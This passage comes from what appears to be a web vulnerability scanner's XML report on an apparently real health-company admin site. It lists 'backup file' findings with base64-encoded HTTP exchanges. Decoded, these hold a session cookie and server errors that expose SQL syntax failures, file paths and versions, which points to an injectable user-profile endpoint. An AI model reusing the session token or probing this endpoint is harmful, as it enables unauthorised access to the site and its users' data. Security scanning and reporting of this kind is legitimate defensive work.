      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODMyDQpTZXQtQ29va2llOiBBV1NBTEI9RFFiZ0RjWC85bXF6MDVIN05COUFqMmRYbXAxeU9XMXJIQjlnUE5rTFhtMXlST0UxeUd6VUZIY25vSjZkUkJzY1hsNHVyODFmd3RMa2RMSlYyblZXTFlBMHNaclFFNitOUkJaMjF4RWw3dk5uTXE3ZkNJQkY1eG1TeW1GeDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI0IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPURRYmdEY1gvOW1xejA1SDdOQjlBajJkWG1wMXlPVzFySEI5Z1BOa0xYbTF5Uk9FMXlHelVGSGNub0o2ZFJCc2NYbDR1cjgxZnd0TGtkTEpWMm5WV0xZQTBzWnJRRTYrTlJCWjIxeEVsN3ZObk1xN2ZDSUJGNXhtU3ltRng7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKDJuZCBjb3B5KScgYXQgbGluZSAxIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAoMm5kIGNvcHkpJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCczOTkgKDJuZCBjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvYW1xJTIwKDJuZCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzMzDQpTZXQtQ29va2llOiBBV1NBTEI9amE1NktLclVvZTNvdzRXMHc1SW1oR3kxcTRhNnNtVTF1NUVLNWNSZHZSakhEVEJJRk1DUDI3N3F2V2lFaVAyN2U3VVhKZ0l3Y0ltTDhva0JHRTBwVjE2L1FoWkVDVk5mQU9idnBaM1d2L3NBcHRXaXFBb05mMDNMSHBJRDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI0IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWphNTZLS3JVb2Uzb3c0VzB3NUltaEd5MXE0YTZzbVUxdTVFSzVjUmR2UmpIRFRCSUZNQ1AyNzdxdldpRWlQMjdlN1VYSmdJd2NJbUw4b2tCR0UwcFYxNi9RaFpFQ1ZOZkFPYnZwWjNXdi9zQXB0V2lxQW9OZjAzTEhwSUQ7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogSW5jb3JyZWN0IHBhcmFtZXRlcnMgaW4gdGhlIGNhbGwgdG8gc3RvcmVkIGZ1bmN0aW9uIGBhbXFgIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ2FtcSAoMm5kIGNvcHkpJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCdhbXEgKDJuZCBjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6522611639344603136</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20(3rd%20copy)]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwKDNyZCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODMyDQpTZXQtQ29va2llOiBBV1NBTEI9b1JMTkRRK3RDaW9HenM3Y0xYc1RSZFZ3VUQ3eG1FR1gyZ2h0VHJVTnY2TEY1cUpmT1hRMlZQVloxcXFFb0xTdWtYVEtjanpLdVM0eTVDQndlZlhLQjl6elowWTNwWS9Ld2s1YXVmMjQxUS9BVGVYR3RrWE1ScU4rc3pSRjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI1IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPW9STE5EUSt0Q2lvR3pzN2NMWHNUUmRWd1VEN3htRUdYMmdodFRyVU52NkxGNXFKZk9YUTJWUFZaMXFxRW9MU3VrWFRLY2p6S3VTNHk1Q0J3ZWZYS0I5enpaMFkzcFkvS3drNWF1ZjI0MVEvQVRlWEd0a1hNUnFOK3N6UkY7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnKDNyZCBjb3B5KScgYXQgbGluZSAxIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAoM3JkIGNvcHkpJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCczOTkgKDNyZCBjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUveXV4JTIwKDNyZCUyMGNvcHkpIEhUVFAvMg0KSG9zdDogYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHk7IEFXU0FMQj1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYOyBBV1NBTEJDT1JTPUJzRERZbjZJN0tobVBpaVJsRzNVRUtHM0tReW53VEhueE5uMFc3cGIrTWxUMmU5bE1ydERLaWZXcGRQUXdXb1Jab2hzM3FRSVd3VS9jTHg4S3YwRlBtRXZpWnpmZ1Zxd25tQnZEUlFMMndoRHFRb3Q5WXdTS2VTSVdhOVgNCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KWC1SZXF1ZXN0ZWQtV2l0aDogWE1MSHR0cFJlcXVlc3QNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOA0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCkNvbnRlbnQtTGVuZ3RoOiA3NQ0KDQpTYXZlPVNhdmUmZmlyc3ROYW1lPVlZWSZsYXN0TmFtZT1jeXBhcnRhJnBob25lPTAwMDAwMDAwMDAmZW50cmllc1BlclBhZ2U9NTA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyNSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzMzDQpTZXQtQ29va2llOiBBV1NBTEI9RVpEUnlTdG12NTJHbkY1aXlFYjVpcFoxcGNVUGVlcnRZTHJjdy9jZnkyNmRmZ25PVXYyNW4xTTRqenkzN1dFbUpwc21OeE4xcDZkbjlRSUNhSkpaUjNtN1Y3Z1BEdGJyQnc4SXNXbWRPamNDUitPalp5bkRSNnBoVWV5QzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI1IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUVaRFJ5U3RtdjUyR25GNWl5RWI1aXBaMXBjVVBlZXJ0WUxyY3cvY2Z5MjZkZmduT1V2MjVuMU00anp5MzdXRW1KcHNtTnhOMXA2ZG45UUlDYUpKWlIzbTdWN2dQRHRickJ3OElzV21kT2pjQ1IrT2paeW5EUjZwaFVleUM7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyNSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogSW5jb3JyZWN0IHBhcmFtZXRlcnMgaW4gdGhlIGNhbGwgdG8gc3RvcmVkIGZ1bmN0aW9uIGB5dXhgIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ3l1eCAoM3JkIGNvcHkpJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCd5dXggKDNyZCBjb3B5KScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjI0PC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>444572816274696192</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/399%20-%20Copy]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwLSUyMENvcHkgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgc2NyZWVuV2lkdGg9MTM2ODsgVXNlclRvdGFsRXZlbnRzPWh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclRvdGFsRXZlbnRzLz9hamF4PXRydWU7IHN0YWZmRGFzaGJvYXJkT3JnYW5pemF0aW9uPXVuZGVmaW5lZDsgc3RhZmZEYX